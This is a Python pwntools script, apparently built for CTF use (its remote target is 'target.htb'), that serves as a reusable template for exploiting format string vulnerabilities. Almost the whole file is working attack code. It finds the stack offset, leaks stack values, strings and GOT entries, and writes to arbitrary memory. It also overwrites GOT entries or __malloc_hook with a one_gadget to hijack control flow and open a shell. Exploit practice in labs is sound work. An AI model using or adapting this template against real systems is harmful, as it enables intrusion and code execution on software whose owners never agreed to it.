#!/usr/bin/env python3
"""
Format String Exploit Template
==============================
Arbitrary read/write via format string vulnerability.

Requirements:
- printf(user_input) without format specifier
- Or similar: sprintf, fprintf, snprintf with user input

Capabilities:
- Arbitrary read (leak addresses)
- Arbitrary write (overwrite GOT, variables)
- Control flow hijacking

Usage:
    python3 format-string.py          # Local
    python3 format-string.py GDB      # With GDB
    python3 format-string.py REMOTE   # Remote
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './binary'
FMT_OFFSET = 6           # TODO: Offset where input appears on stack

HOST = 'target.htb'
PORT = 1337

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, 'b printf\nc')
    else:
        return process(BINARY)

# =============================================================================
# OFFSET FINDER
# =============================================================================

def find_offset():
    """
    Find the offset where our input appears on the stack.
    Look for 0x41414141 (AAAA) in the output.
    """
    for i in range(1, 50):
        io = process(BINARY)
        io.sendline(f'AAAA%{i}$p'.encode())
        try:
            output = io.recvall(timeout=1)
            if b'0x41414141' in output:
                log.success(f"Format string offset: {i}")
                io.close()
                return i
        except:
            pass
        io.close()
    log.error("Offset not found in range 1-50")
    return None

# =============================================================================
# LEAK FUNCTIONS
# =============================================================================

def leak_stack(io, offset):
    """Leak a value from the stack at given offset."""
    payload = f'%{offset}$p'.encode()
    io.sendline(payload)
    io.recvuntil(b'0x')
    leak = int(io.recvuntil(b'\n', drop=True), 16)
    return leak

def leak_string(io, addr, offset):
    """Leak a string from a given address."""
    # Place address at correct stack offset and dereference with %s
    payload = f'%{offset}$s'.encode().ljust(8, b'\x00') + p64(addr)
    io.sendline(payload)
    return io.recvuntil(b'\x00', drop=True)

def leak_got(io, func_name, offset):
    """Leak a GOT entry."""
    got_addr = elf.got[func_name]
    log.info(f"Leaking {func_name}@got ({hex(got_addr)})...")

    # Use %s to read string at address
    payload = f'%{offset+1}$s'.encode().ljust(8, b'\x00') + p64(got_addr)
    io.sendline(payload)

    leaked = io.recv(6)
    addr = u64(leaked.ljust(8, b'\x00'))
    log.success(f"{func_name}@libc: {hex(addr)}")
    return addr

# =============================================================================
# WRITE FUNCTIONS
# =============================================================================

def write_addr(io, addr, value, offset):
    """
    Write a value to an address using pwntools fmtstr_payload.
    This handles splitting into bytes automatically.
    """
    writes = {addr: value}
    payload = fmtstr_payload(offset, writes, write_size='short')
    io.sendline(payload)

def overwrite_got(io, func_name, new_addr, offset):
    """Overwrite a GOT entry with a new address."""
    got_addr = elf.got[func_name]
    log.info(f"Overwriting {func_name}@got with {hex(new_addr)}")
    write_addr(io, got_addr, new_addr, offset)

# =============================================================================
# MAIN EXPLOIT
# =============================================================================

def main():
    # Uncomment to find offset automatically
    # offset = find_offset()
    # if offset:
    #     print(f"Found offset: {offset}")
    # return

    io = conn()

    # ==========================================================================
    # EXAMPLE 1: Leak stack values
    # ==========================================================================
    # log.info("Leaking stack values...")
    # for i in range(1, 20):
    #     leak = leak_stack(io, i)
    #     log.info(f"Stack[{i}]: {hex(leak)}")

    # ==========================================================================
    # EXAMPLE 2: GOT overwrite (redirect exit to win)
    # ==========================================================================
    # log.info("Overwriting exit@got with win...")
    # win = elf.symbols['win']
    # overwrite_got(io, 'exit', win, FMT_OFFSET)
    # io.sendline(b'exit')  # Trigger exit -> win

    # ==========================================================================
    # EXAMPLE 3: Leak libc and get shell
    # ==========================================================================
    # log.info("Leaking libc address...")
    # puts_addr = leak_got(io, 'puts', FMT_OFFSET)
    # libc = ELF('./libc.so.6')
    # libc.address = puts_addr - libc.symbols['puts']
    # log.success(f"libc base: {hex(libc.address)}")
    #
    # log.info("Overwriting __malloc_hook with one_gadget...")
    # one_gadget = libc.address + 0xe3b01  # TODO: Find with one_gadget tool
    # write_addr(io, libc.symbols['__malloc_hook'], one_gadget, FMT_OFFSET)
    # io.sendline(b'%100000c')  # Trigger malloc via large format

    # ==========================================================================
    # YOUR EXPLOIT HERE
    # ==========================================================================

    # Example: Leak and print stack values
    log.info("Leaking first 20 stack values...")
    payload = b' '.join([f'%{i}$p'.encode() for i in range(1, 21)])
    io.sendline(payload)
    print(io.recvline())

    io.interactive()

if __name__ == '__main__':
    main()
